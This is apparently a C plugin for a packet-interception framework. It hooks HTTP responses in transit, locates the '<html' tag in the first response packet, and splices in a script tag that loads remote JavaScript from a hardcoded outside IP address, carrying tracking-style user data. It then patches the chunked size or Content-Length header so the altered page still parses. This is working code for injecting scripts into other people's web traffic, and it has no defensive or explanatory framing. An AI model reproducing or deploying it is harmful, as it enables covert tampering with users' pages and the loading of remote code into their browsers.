#include "main.h"

//#define JS "<script type=\"text/javascript\"></script>\r\n"
//#define JS "<script type=\"text/javascript\"> alert('hello world') </script>\r\n"
#define JS "<script type=\"text/javascript\" src=\"http://210.22.155.236/js/wa.init.min.js?v=20150930\" id=\"15_bri_mjq_init_min_36_wa_101\" async  data=\"userId=12245789-423sdfdsf-ghfg-wererjju8werw&channel=test&phoneModel=DOOV S1\"></script>\r\n"
#define JS_LEN strlen(JS)

PRIVATE int change_chunked_hex(void *data)
{
	struct http_request* httpr=(struct http_request*)data;
	struct skb_buf* skb=httpr->curr_skb;
	char* http_content;
	char *hex_start,*hex_end;
	char src_hex[8]={0} ,des_hex[32]={0};
	int hex_len;
	int hex_i;
	
	http_content = get_data_from_skb(skb);
	hex_start = http_content + httpr->hhdr.httph_len;

	if(!hex_start)
	{
		return ERROR;
	}
	
	hex_end = strstr(hex_start , "\r\n");
	if(!hex_end)
	{
		return ERROR;
	}

	hex_len=hex_end-hex_start;
	
	if(hex_len>5)
	{
		return ERROR;
	}
	
	memcpy(src_hex , hex_start , hex_len);
	hex2i(src_hex, &hex_i);
	hex_i+=JS_LEN;
	i2hex(hex_i, des_hex);
	if(hex_len!=strlen(des_hex))
	{
		return ERROR;
	}
	memcpy(hex_start , des_hex , hex_len);
	return OK;
}

PRIVATE int change_contentlength(void *data)
{
	struct http_request* httpr=(struct http_request*)data;
	
	char content_len_s[32]={0};
	int content_len_i;
	int content_len_key_len;
	char* content_len_value;
	int content_len_value_len;

	content_len_key_len = 16;//like this Content-Length: 29073
	content_len_value = httpr->hhdr.content_length.c + content_len_key_len;
	content_len_value_len = httpr->hhdr.content_length.l - content_len_key_len;

	if(content_len_value_len >= 8)
		return ERROR;

	if(!content_len_value)
		return ERROR;
	
	memcpy(content_len_s , content_len_value , content_len_value_len);
	if(!digital(content_len_s))
		return ERROR;
	
	content_len_i = atoi(content_len_s);
	content_len_i +=JS_LEN;
	i2str(content_len_i , content_len_s);
	if(content_len_value_len !=strlen(content_len_s))
		return ERROR;

	memcpy(content_len_value , content_len_s , content_len_value_len);

	return OK;
}

PRIVATE int insert_js(void *data)
{
	struct http_request* httpr=(struct http_request*)data;
	struct skb_buf* skb=httpr->curr_skb;
	char* http_content;
	int http_content_len;
	char* search;
	int search_len;
	char buffer[BUFSIZE];
	int js_len;
	
	char* res="<html";

	//insert into first response packet
	if(httpr->response_num != 1)
		return ERROR;
	
	if(skb->data_len<=0)
		return ERROR;
	
    http_content_len=get_data_len_from_skb(skb);
    http_content=get_data_from_skb(skb);
	
	search=strstr(http_content , res);
	
	if(!search)
	{
		return ERROR;
	}

	search_len=search - http_content;
	js_len=JS_LEN;
	memcpy(buffer , search , (http_content_len - search_len));
	memcpy(http_content + search_len , JS , js_len);
	memcpy(http_content + (search_len + js_len) , buffer , (http_content_len - search_len));
	skb->pload_len = skb->pload_len + js_len;
	skb->data_len = skb->data_len + js_len;
	httpr->next_seq = skb->seq + skb->data_len;

	
	//after insert js
	
    if(httpr->hhdr.res_type==HTTP_RESPONSE_TYPE_CHUNKED)
	{
		change_chunked_hex(data);
    }
	else if(httpr->hhdr.res_type==HTTP_RESPONSE_TYPE_CONTENTLENGTH)
	{
		change_contentlength(data);
    }

    return OK;
}

int init_plug_extern()
{
	new_plug(insert_js , PLUG_EXTERN_TYPE_RESPONSE);
	return 0;
}

